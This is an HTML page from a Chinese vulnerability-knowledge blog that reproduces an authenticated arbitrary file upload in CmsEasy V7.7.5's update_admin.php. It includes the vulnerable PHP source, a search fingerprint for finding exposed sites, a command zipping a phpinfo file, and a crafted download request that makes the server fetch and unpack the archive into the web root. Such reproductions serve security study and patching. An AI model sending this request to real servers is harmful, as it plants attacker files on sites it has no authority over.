@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>CmsEasy update_admin.php 后台任意文件上传漏洞 - Chinchin&#39;s blog</title><meta name="Description" content="这是我的全新 Hugo 网站"><meta property="og:title" content="CmsEasy update_admin.php 后台任意文件上传漏洞" />
+<meta property="og:description" content="CmsEasy update_admin.php 后台任意文件上传漏洞 漏洞描述 CmsEasy 后台存在任意文件上传漏洞，通过文件 service.php 加密Url参数执行即可上传任意文件 漏洞影响 1 CmsEasy V7.7.5_20210919 网络测绘 1 body=&#34;cmseasyedit&#34; 漏洞复现 存" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/cmseasy-update_admin.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-08T01:08:29+08:00" />
+<meta property="article:modified_time" content="2023-12-08T01:08:29+08:00" /><meta property="og:site_name" content="Chinchin&#39;s blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/logo.png"/>
+
+<meta name="twitter:title" content="CmsEasy update_admin.php 后台任意文件上传漏洞"/>
+<meta name="twitter:description" content="CmsEasy update_admin.php 后台任意文件上传漏洞 漏洞描述 CmsEasy 后台存在任意文件上传漏洞，通过文件 service.php 加密Url参数执行即可上传任意文件 漏洞影响 1 CmsEasy V7.7.5_20210919 网络测绘 1 body=&#34;cmseasyedit&#34; 漏洞复现 存"/>
+<meta name="twitter:site" content="@xxxx"/>
+<meta name="application-name" content="Chinchin&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Chinchin&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/cmseasy-update_admin.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" /><link rel="prev" href="http://example.org/consul-docker-images-%E7%A9%BA%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E-cve-2020-29564/" /><link rel="next" href="http://example.org/cmseasy-language_admin.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "CmsEasy update_admin.php 后台任意文件上传漏洞",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/cmseasy-update_admin.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E\/"
+        },"genre": "posts","keywords": "漏洞知识库","wordcount":  400 ,
+        "url": "http:\/\/example.org\/cmseasy-update_admin.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E\/","datePublished": "2023-12-08T01:08:29+08:00","dateModified": "2023-12-08T01:08:29+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Chinchin"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Chinchin&#39;s blog"><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Chinchin&#39;s blog"><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CmsEasy update_admin.php 后台任意文件上传漏洞</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>漏洞知识库</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-12-08">2023-12-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;400 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;One minute&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="true">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#漏洞描述">漏洞描述</a></li>
+    <li><a href="#漏洞影响">漏洞影响</a></li>
+    <li><a href="#网络测绘">网络测绘</a></li>
+    <li><a href="#漏洞复现">漏洞复现</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="cmseasy-update_adminphp-后台任意文件上传漏洞">CmsEasy update_admin.php 后台任意文件上传漏洞</h1>
+<h2 id="漏洞描述">漏洞描述</h2>
+<p>CmsEasy 后台存在任意文件上传漏洞，通过文件 service.php 加密Url参数执行即可上传任意文件</p>
+<h2 id="漏洞影响">漏洞影响</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">CmsEasy V7.7.5_20210919
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="网络测绘">网络测绘</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">body=&#34;cmseasyedit&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="漏洞复现">漏洞复现</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202205181436747.png"
+        data-srcset="/images/202205181436747.png, /images/202205181436747.png 1.5x, /images/202205181436747.png 2x"
+        data-sizes="auto"
+        alt="/images/202205181436747.png"
+        title="image-20220518143113914" /></p>
+<p>存在漏洞的文件为 <code>lib/admin/update_admin.php</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202205181437877.png"
+        data-srcset="/images/202205181437877.png, /images/202205181437877.png 1.5x, /images/202205181437877.png 2x"
+        data-sizes="auto"
+        alt="/images/202205181437877.png"
+        title="image-20220518143714802" /></p>
+<p>其中需要注意的代码为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">function</span> <span class="n">downfile_action</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="o">$</span><span class="n">url</span> <span class="o">=</span> <span class="n">front</span><span class="p">::</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">$</span><span class="n">url</span><span class="o">=</span><span class="n">service</span><span class="p">::</span><span class="n">getInstance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">unlockString</span><span class="p">(</span><span class="o">$</span><span class="n">url</span><span class="p">,</span><span class="s2">&#34;cmseasy_url&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">$</span><span class="n">res</span> <span class="o">=</span> <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">get_file</span><span class="p">(</span><span class="o">$</span><span class="n">url</span><span class="p">,</span> <span class="s1">&#39;cache&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!$</span><span class="n">res</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="o">$</span><span class="n">res</span> <span class="o">=</span> <span class="n">array</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;err&#39;</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;data&#39;</span> <span class="o">=&gt;</span> <span class="n">lang_admin</span><span class="p">(</span><span class="s1">&#39;update_package_download_failed&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="err">@</span><span class="n">unlink</span><span class="p">(</span><span class="s1">&#39;upgrade/config_cn.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="err">@</span><span class="n">unlink</span><span class="p">(</span><span class="s1">&#39;upgrade/config_cn.tmp.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="err">@</span><span class="n">unlink</span><span class="p">(</span><span class="s1">&#39;upgrade/upgrade.sql&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="err">@</span><span class="n">unlink</span><span class="p">(</span><span class="s1">&#39;upgrade/command.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">front</span><span class="p">::</span><span class="n">remove</span><span class="p">(</span><span class="n">ROOT</span><span class="o">.</span><span class="s1">&#39;/cache/data&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">front</span><span class="p">::</span><span class="n">remove</span><span class="p">(</span><span class="n">ROOT</span><span class="o">.</span><span class="s1">&#39;/cache/template&#39;</span><span class="p">);</span><span class="o">//</span><span class="err">清空全部语言</span>
+</span></span><span class="line"><span class="cl">            <span class="o">$</span><span class="n">langdata</span><span class="o">=</span><span class="n">getlang</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">langdata</span> <span class="o">!=</span> <span class="s2">&#34;&#34;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">                <span class="n">foreach</span> <span class="p">(</span><span class="o">$</span><span class="n">langdata</span> <span class="n">as</span> <span class="o">$</span><span class="n">key</span><span class="o">=&gt;$</span><span class="n">val</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">front</span><span class="p">::</span><span class="n">remove</span><span class="p">(</span><span class="n">ROOT</span><span class="o">.</span><span class="s1">&#39;/cache/&#39;</span><span class="o">.$</span><span class="n">val</span><span class="p">[</span><span class="s1">&#39;langurlname&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">front</span><span class="p">::</span><span class="n">remove</span><span class="p">(</span><span class="n">ROOT</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.$</span><span class="n">val</span><span class="p">[</span><span class="s1">&#39;langurlname&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/template&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="o">//</span><span class="err">先清空缓存</span>
+</span></span><span class="line"><span class="cl">            <span class="n">user</span><span class="p">::</span><span class="n">deletesession</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="n">category</span><span class="p">::</span><span class="n">deletesession</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="o">//</span><span class="err">提取分类</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="n">file_exists</span><span class="p">(</span><span class="n">ROOT</span><span class="o">.</span><span class="s2">&#34;/lib/table/type.php&#34;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">type</span><span class="p">::</span><span class="n">deletesession</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="o">//</span><span class="err">提取专题</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="n">file_exists</span><span class="p">(</span><span class="n">ROOT</span><span class="o">.</span><span class="s2">&#34;/lib/table/special.php&#34;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">special</span><span class="p">::</span><span class="n">deletesession</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="o">$</span><span class="n">archive</span> <span class="o">=</span> <span class="n">new</span> <span class="n">PclZip</span><span class="p">(</span><span class="s1">&#39;cache/patch.zip&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">$</span><span class="n">archive</span><span class="o">-&gt;</span><span class="n">extract</span><span class="p">(</span><span class="n">PCLZIP_OPT_PATH</span><span class="p">,</span> <span class="n">ROOT</span><span class="p">,</span> <span class="n">PCLZIP_OPT_REPLACE_NEWER</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="n">file_exists</span><span class="p">(</span><span class="s1">&#39;upgrade/upgrade.sql&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="o">$</span><span class="n">sqlquery</span> <span class="o">=</span> <span class="n">file_get_contents</span><span class="p">(</span><span class="s1">&#39;upgrade/upgrade.sql&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="o">$</span><span class="n">sqlquery</span> <span class="o">=</span> <span class="n">str_replace</span><span class="p">(</span><span class="s1">&#39;`cmseasy_&#39;</span><span class="p">,</span> <span class="s1">&#39;`&#39;</span> <span class="o">.</span> <span class="n">config</span><span class="p">::</span><span class="n">getdatabase</span><span class="p">(</span><span class="s1">&#39;database&#39;</span><span class="p">,</span> <span class="s1">&#39;prefix&#39;</span><span class="p">),</span> <span class="o">$</span><span class="n">sqlquery</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="o">$</span><span class="n">sqlquery</span> <span class="o">=</span> <span class="n">str_replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="o">$</span><span class="n">sqlquery</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="o">$</span><span class="n">sqls</span> <span class="o">=</span> <span class="n">preg_split</span><span class="p">(</span><span class="s2">&#34;/;(--)*[ </span><span class="se">\t</span><span class="s2">]{0,}</span><span class="se">\n</span><span class="s2">/&#34;</span><span class="p">,</span> <span class="o">$</span><span class="n">sqlquery</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">exec_cms_sql</span><span class="p">(</span><span class="o">$</span><span class="n">sqls</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="n">file_exists</span><span class="p">(</span><span class="s1">&#39;upgrade/command.php&#39;</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">                <span class="n">include</span> <span class="n">ROOT</span> <span class="o">.</span> <span class="s1">&#39;/upgrade/command.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="o">$</span><span class="n">res</span> <span class="o">=</span> <span class="n">array</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;err&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;message&#39;</span> <span class="o">=&gt;</span> <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">message</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;data&#39;</span> <span class="o">=&gt;</span> <span class="n">lang_admin</span><span class="p">(</span><span class="s1">&#39;upgrade_successful&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">echo</span> <span class="n">json_encode</span><span class="p">(</span><span class="o">$</span><span class="n">res</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中使用 unlockString 和 get_file 方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$url = front::get(&#39;url&#39;);
+</span></span><span class="line"><span class="cl">$url=service::getInstance()-&gt;unlockString($url,&#34;cmseasy_url&#34;);
+</span></span><span class="line"><span class="cl">$res = $this-&gt;get_file($url, &#39;cache&#39;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202205181437707.png"
+        data-srcset="/images/202205181437707.png, /images/202205181437707.png 1.5x, /images/202205181437707.png 2x"
+        data-sizes="auto"
+        alt="/images/202205181437707.png"
+        title="image-20220518143733612" /></p>
+<p>写入后在上层目录写入文件，即Web根目录，创建压缩包并上传可访问的服务器上</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">zip phpinfo.zip phpinfo.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>构造下载请求</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202205181437504.png"
+        data-srcset="/images/202205181437504.png, /images/202205181437504.png 1.5x, /images/202205181437504.png 2x"
+        data-sizes="auto"
+        alt="/images/202205181437504.png"
+        title="image-20220518143751402" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/index.php?case=update&amp;act=downfile&amp;admin_dir=admin&amp;site=default&amp;url=buTdBnP8%3DJ%3DELYuF8Z2IwZyM-awr9fH%3D0cax6mxICukxw
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202205181438629.png"
+        data-srcset="/images/202205181438629.png, /images/202205181438629.png 1.5x, /images/202205181438629.png 2x"
+        data-sizes="auto"
+        alt="/images/202205181438629.png"
+        title="image-20220518143812559" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202205181438160.png"
+        data-srcset="/images/202205181438160.png, /images/202205181438160.png 1.5x, /images/202205181438160.png 2x"
+        data-sizes="auto"
+        alt="/images/202205181438160.png"
+        title="image-20220518143830101" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-12-08</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/cmseasy-update_admin.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/cmseasy-update_admin.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-title="CmsEasy update_admin.php 后台任意文件上传漏洞" data-via="xxxx" data-hashtags="漏洞知识库"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/cmseasy-update_admin.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-hashtag="漏洞知识库"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/cmseasy-update_admin.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-title="CmsEasy update_admin.php 后台任意文件上传漏洞"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/cmseasy-update_admin.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-title="CmsEasy update_admin.php 后台任意文件上传漏洞"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/cmseasy-update_admin.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-title="CmsEasy update_admin.php 后台任意文件上传漏洞"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/">漏洞知识库</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/consul-docker-images-%E7%A9%BA%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E-cve-2020-29564/" class="prev" rel="prev" title="Consul Docker images 空密码登录漏洞 CVE-2020-29564"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Consul Docker images 空密码登录漏洞 CVE-2020-29564</a>
+            <a href="/cmseasy-language_admin.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="next" rel="next" title="CmsEasy language_admin.php 后台命令执行漏洞">CmsEasy language_admin.php 后台命令执行漏洞<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
